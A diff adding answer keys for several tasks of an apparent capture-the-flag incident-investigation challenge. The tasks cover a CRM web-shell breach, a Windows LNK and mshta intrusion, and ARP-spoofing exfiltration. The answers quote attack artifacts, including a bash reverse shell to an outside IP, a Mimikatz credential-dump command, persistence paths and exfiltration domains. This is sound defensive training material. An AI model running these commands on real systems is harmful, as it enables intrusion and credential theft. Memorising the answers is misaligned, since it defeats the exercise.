@@ -29,3 +29,56 @@ Task 4. Phishing Books
 
 
 
+Task 5. Portal Drop
+
+1. What is the IP address that initiated the brute force on the CRM web portal? 34.67.91.83
+2. How many successful and failed logins are seen in the logs? 18, 35
+3. Following the brute force, which user-agent was used for the file upload? python-requests/2.31.0
+4. What was the name of the suspicious file uploaded by the attacker? invoice.php
+5. At what time did the attacker first invoke the uploaded script? 2025-11-06 14:27:34
+6. What is the first decoded command the attacker ran on the CRM? whoami
+7. Based on the attacker’s activity on the CRM, which MITRE ATT&CK Persistence sub-technique ID is most applicable? T1505.003
+8. Which process image executes attacker commands received from the web? /usr/sbin/php-fpm7.4
+9. What command allowed the attacker to open a bash reverse shell? bash -i >& /dev/tcp/115.58.148.86/8080 0>&1
+10. Which Linux user executes the entered malicious commands? www-data 
+11. What sensitive CRM configuration file did the attacker access?  /etc/trycrm/config.json
+12. Which domain was used to exfiltrate the CRM portal database? portaldrop2025.xyz
+13. What flag do you get after completing all 12 EDR response actions? THM{p0rtal_dropp3d?}
+
+
+Task 6. Zero Tolerance
+
+1. What is the hostname where the Initial Access occurred? JP-BROWN-WS
+2. What MITRE subtechnique ID describes the initial code execution on the beachhead? T1204.002
+3. What is the full path of the malicious file that led to Initial Access? C:\Users\jp.brown\Downloads\TravisClart_Resume.pdf.lnk
+4. What is the full path to the LOLBin abused by the attacker for Initial Access? C:\Windows\System32\mshta.exe
+5. What is the IP address of the attacker's Command & Control server? 10.10.14.174
+6. What is the full path of the process responsible for the C2 beaconing? C:\Windows\Temp\RuntimeBroker.exe
+7. What is the full path, modified for Persistence on the beachhead host? HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemMonitor
+8. What tool and parameter did the threat actor use for credential dumping? Invoke-Mimikatz -DumpCreds
+9. The threat actor executed a command to evade defenses. What security parameter did they attempt to change? DisableRealtimeMonitoring
+10. What is the process ID (PID) that executed the remote command? 6612
+11. At what time did the threat actor pivot from the beachhead to another system? 2025-11-14 05:19:42
+12. What is the full path of the PowerShell script used by the threat actor to collect data? C:\Windows\Temp\Setup-BackupServer.ps1
+13. What are the first 4 file extensions targeted by this script for exfiltration? .bak, .backup, .sql, .mdb
+14. What is the full path to the staged file containing collected files? C:\Users\bkup-svc\AppData\Local\Temp\sysbackup_20251114.dat
+
+
+
+Task 7. The Crown Jewel
+
+1. From which internal IP did the suspicious connection originate? 10.10.10.100
+2. What outbound connection was detected as a C2 channel? (Answer example: 1.2.3.4:9996) 1.1.1.1:8080
+3. Which MAC address is impersonating the gateway 10.10.10.1? 00:0c:29:11:22:33
+4. What is the non-standard User-Agent hitting the Jira instance? CVE-202X-EXPLOIT
+5. How many ARP spoofing attacks were observed in the PCAP? 90
+6. What's the payload containing the plaintext creds found in the POST request? username=dev_user&password=SecretPassword!
+7. What domain, owned by the attacker, was used for data exfiltration? exfil-domain.xyz
+8. After examining the logs, which protocol was used for data exfiltration? DNS
+
+
+
+Task 8. Promotion Night
+
+Will upload tomorrow!
+
